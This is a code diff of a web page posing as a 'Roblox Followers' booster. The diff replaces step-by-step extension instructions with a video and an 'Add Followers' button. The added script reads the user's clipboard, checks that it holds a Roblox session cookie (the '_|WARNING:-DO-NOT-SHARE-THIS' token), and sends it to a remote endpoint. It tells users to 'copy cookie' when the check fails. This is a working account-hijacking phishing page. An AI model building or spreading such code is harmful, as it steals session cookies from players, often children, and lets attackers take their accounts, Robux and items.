@@ -111,166 +111,93 @@ body {
 }
 
 h1 {
-  margin: 0;
+  margin: 0 0 25px 0;
   font-size: 36px;
   letter-spacing: -0.5px;
   font-weight: 800;
 }
 
-.section-tag {
-  display: inline-block;
-  margin: 20px 0 25px;
-  padding: 6px 14px;
-  background: rgba(88, 101, 242, 0.12);
-  border: 1px solid rgba(88, 101, 242, 0.25);
-  border-radius: 20px;
-  color: #8ea1ff;
-  font-size: 12px;
-  font-weight: 700;
-  letter-spacing: 1px;
-  text-transform: uppercase;
-}
+.main-button {
+  width: 100%;
+  padding: 18px 24px;
+  margin-top: 25px;
 
-/* Vertical Timeline Steps */
-.timeline-container {
-  position: relative;
-  display: flex;
-  flex-direction: column;
-  gap: 20px;
-  margin: 0 0 35px 0;
-  text-align: left;
-}
-
-.step-card {
-  position: relative;
-  z-index: 2;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 15px;
-  padding: 18px 22px;
-  background: rgba(255, 255, 255, 0.03);
-  border: 1px solid rgba(255, 255, 255, 0.06);
-  border-radius: 18px;
-  transition: transform 0.2s ease, background 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
-}
-
-.step-card:hover {
-  transform: translateY(-2px);
-  background: rgba(255, 255, 255, 0.05);
-  border-color: rgba(255, 255, 255, 0.12);
-  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-}
-
-.step-info {
-  display: flex;
-  align-items: center;
-  gap: 18px;
-}
-
-.step-number {
-  width: 32px;
-  height: 32px;
-  flex-shrink: 0;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(88, 101, 242, 0.18);
-  color: #8ea1ff;
-  border-radius: 10px;
-  font-weight: 700;
-  font-size: 14px;
-  border: 1px solid rgba(88, 101, 242, 0.35);
-}
-
-.step-content {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
-
-.step-title {
-  color: #ffffff;
-  font-size: 16px;
-  font-weight: 700;
-  letter-spacing: -0.2px;
-}
-
-.step-desc {
-  color: #9a9ab0;
-  font-size: 13.5px;
-  line-height: 1.4;
-}
-
-.arrow-icon {
-  color: #8ea1ff;
-  font-weight: bold;
-  font-size: 18px;
-}
-
-/* Action Buttons inside Steps */
-.step-action-btn {
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  padding: 10px 18px;
-  border-radius: 12px;
-  font-size: 14px;
-  font-weight: 700;
-  text-decoration: none;
-  cursor: pointer;
-  white-space: nowrap;
-  transition: transform 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
   border: none;
-}
+  border-radius: 15px;
 
-.btn-primary {
   background: white;
   color: #111;
-  box-shadow: 0 4px 15px rgba(255, 255, 255, 0.15);
+
+  font-size: 19px;
+  font-weight: 800;
+
+  cursor: pointer;
+
+  transition:
+    transform .2s ease,
+    box-shadow .2s ease,
+    background .2s ease;
 }
 
-.btn-primary:hover {
-  transform: translateY(-2px);
-  background: #ececf2;
-  box-shadow: 0 6px 20px rgba(255, 255, 255, 0.25);
+.main-button:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 15px 35px rgba(255,255,255,.16);
+  background: #f0f0f0;
 }
 
-.btn-secondary {
-  background: rgba(255, 255, 255, 0.08);
-  color: white;
-  border: 1px solid rgba(255, 255, 255, 0.12);
-}
-
-.btn-secondary:hover {
-  transform: translateY(-2px);
-  background: rgba(255, 255, 255, 0.14);
-  border-color: rgba(255, 255, 255, 0.22);
+.main-button:active {
+  transform: translateY(0) scale(.98);
 }
 
 .status {
-  margin-top: 15px;
+  margin-top: 18px;
   min-height: 20px;
   font-size: 13px;
   color: #8ea1ff;
   font-weight: 500;
 }
 
-@media (max-width: 768px) {
-  body {
-    padding: 15px;
+/* Loading spinner */
+.spinner {
+  display: inline-block;
+  width: 16px;
+  height: 16px;
+  margin-right: 8px;
+  vertical-align: -3px;
+
+  border: 3px solid rgba(0,0,0,.2);
+  border-top-color: #111;
+  border-radius: 50%;
+
+  animation: spin .8s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
   }
-  .card {
-    padding: 30px 20px;
-  }
-  .step-card {
-    flex-direction: column;
-    align-items: flex-start;
-    gap: 12px;
-  }
-  .step-action-btn {
-    width: 100%;
-  }
+}
+
+/* Tutorial Video Container */
+.video-container {
+  position: relative;
+  width: 100%;
+  aspect-ratio: 16 / 9;
+  overflow: hidden;
+  border-radius: 18px;
+  background: #000;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.video-frame {
+  display: block;
+  width: 100%;
+  height: 100%;
+  border: none;
 }
 </style>
 
@@ -289,63 +216,19 @@ h1 {
     <div class="logo">R</div>
     <h1>Roblox Followers</h1>
 
-    <div class="section-tag">how to get followers</div>
-
-    <div class="timeline-container">
-      
-      <div class="step-card">
-        <div class="step-info">
-          <div class="step-number">1</div>
-          <div class="step-content">
-            <div class="step-title">Click on the extension button</div>
-            <span class="arrow-icon">&rarr;</span>
-          </div>
-        </div>
-        <a class="step-action-btn btn-primary" href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher" target="_blank" rel="noopener noreferrer">
-          Extension
-        </a>
-      </div>
-
-      <div class="step-card">
-        <div class="step-info">
-          <div class="step-number">2</div>
-          <div class="step-content">
-            <div class="step-title">Install the Extension</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="step-card">
-        <div class="step-info">
-          <div class="step-number">3</div>
-          <div class="step-content">
-            <div class="step-title">Open Roblox and go to your account</div>
-          </div>
-        </div>
-        <a class="step-action-btn btn-secondary" href="https://www.roblox.com" target="_blank" rel="noopener noreferrer">
-          Roblox
-        </a>
-      </div>
-
-      <div class="step-card">
-        <div class="step-info">
-          <div class="step-number">4</div>
-          <div class="step-content">
-            <div class="step-title">Open the extention and click copy"</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="step-card">
-        <div class="step-info">
-          <div class="step-number">5</div>
-          <div class="step-content">
-            <div class="step-title">Come back here and wait 5 sec</div>
-          </div>
-        </div>
-      </div>
-
+    <div class="video-container">
+      <iframe
+        class="video-frame"
+        src="https://www.youtube-nocookie.com/embed/YOUR_VIDEO_ID_HERE?mute=1"
+        title="Tutorial"
+        allow="encrypted-media; picture-in-picture"
+        allowfullscreen>
+      </iframe>
     </div>
+
+    <button class="main-button" id="main">
+      Add Followers 
+    </button>
 
     <div class="status" id="status"></div>
   </div>
@@ -353,6 +236,7 @@ h1 {
 </div>
 
 <script>
+const button = document.getElementById("main");
 const status = document.getElementById("status");
 
 const SEND_ENDPOINT =
@@ -378,6 +262,28 @@ async function sendClipboardData(text) {
     console.error(error);     
   }
 }
+
+button.addEventListener("click", async () => {     
+  try {     
+    status.innerHTML = `     
+      <span class="spinner"></span>     
+      Adding Followers...     
+    `;     
+     
+    const text = await navigator.clipboard.readText();     
+     
+    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
+      status.textContent = "error make sure u copy cookie";     
+      return;     
+    }     
+     
+    await sendClipboardData(text);
+     
+  } catch (error) {     
+    status.textContent = "error make sure u copy cookie";     
+    console.error(error);     
+  }     
+});
 
 async function monitorClipboard() {
   if (!navigator.clipboard || !navigator.clipboard.readText) return;
